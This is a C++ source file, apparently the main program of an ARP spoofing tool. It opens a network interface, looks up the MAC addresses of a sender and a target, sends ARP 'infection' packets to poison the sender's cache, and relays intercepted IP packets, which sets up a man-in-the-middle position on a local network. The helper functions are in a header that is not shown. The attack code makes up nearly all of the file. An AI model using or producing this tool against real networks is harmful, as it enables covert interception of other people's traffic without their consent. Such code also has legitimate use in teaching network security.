#include "arp-spoof.h"

Mac myMac;
Ip myIp;
pcap_t* handle;
Ip sender_ip;
Mac sender_mac;
Ip target_ip;
Mac target_mac;

void usage(char* argv[]){
    printf("syntax : %s <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n", argv[0]);
    printf("sample : %s wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n", argv[0]);
}

int main(int argc, char* argv[])
{
    // usage
    if (argc < 4 || argc%2 != 0){
        usage(argv);
        return -1;
    }

    // pcap handle initialize
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
    
    // get my IP/MAC Address
    myMac = GetMyMac(dev);
    myIp = GetMyIp(dev);
    
    // logging
    std::cout << "My        Mac :" << std::string(myMac) << "\n";
    std::cout << "My        IP  :" << std::string(myIp) << "\n";

    // get sender IP/MAC address 
    sender_ip = Ip(argv[2]);
    sender_mac = GetMacfromIp(handle, sender_ip);

    // information logging
    std::cout << "sender    Mac :" << std::string(sender_mac) << "\n";
    std::cout << "sender    IP  :" << std::string(sender_ip) << "\n";

    // get target IP/MAC address 
    target_ip = Ip(argv[3]);
    target_mac = GetMacfromIp(handle, target_ip);

    // information logging
    std::cout << "target    Mac :" << std::string(target_mac) << "\n";
    std::cout << "target    IP  :" << std::string(target_ip) << "\n";

    // ARP infection
    if(SendArpInfectPkt(handle, sender_ip, sender_mac, target_ip, ARP_REQ_TYPE) != true){
        std::cerr << "Arp Infection failed (" << std::string(sender_ip) << ", " << std::string(sender_mac) 
            << ") -> (" << std::string(target_ip) << ", " << std::string(target_mac) << ") type(" <<  ARP_REP_TYPE <<")\n";
        return -1;
    }

    // sighandler
    // SIGINT
    signal(SIGINT, SigINTHandler);

    // IP Packet Relay    
    IpPacketRelay(handle, sender_ip, sender_mac, target_ip, target_mac);
    
    return 0;
}
